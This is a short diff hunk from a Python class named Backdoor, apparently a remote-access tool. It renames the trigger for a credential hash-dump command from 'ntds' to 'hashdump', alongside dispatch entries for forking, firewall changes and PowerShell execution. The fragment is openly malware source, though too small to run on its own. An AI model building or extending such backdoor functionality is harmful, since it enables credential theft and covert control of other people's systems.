@@ -381,7 +381,7 @@ class Backdoor:
                 self.fork()
             elif cmd[0] == 'fw' and len(cmd) == 4 :
                 result=self.firewall(cmd[1],cmd[2],cmd[3])
-            elif cmd[0] == "ntds":
+            elif cmd[0] == "hashdump":
                 result = self.hash_dump()
             elif cmd[0] == "powershell":
                 result=self.powershell(cmd[1])
